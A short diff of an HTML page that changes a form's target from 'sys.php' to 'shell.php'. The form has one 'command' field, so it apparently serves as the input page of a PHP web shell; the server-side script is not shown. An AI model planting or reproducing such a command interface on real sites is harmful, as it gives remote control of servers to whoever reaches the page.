@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 </head>
 <body>
-<form method="post" action="sys.php">
+<form method="post" action="shell.php">
 Command: <input type="text" name="command">
 <input type="submit" value="Enter">
 </form>
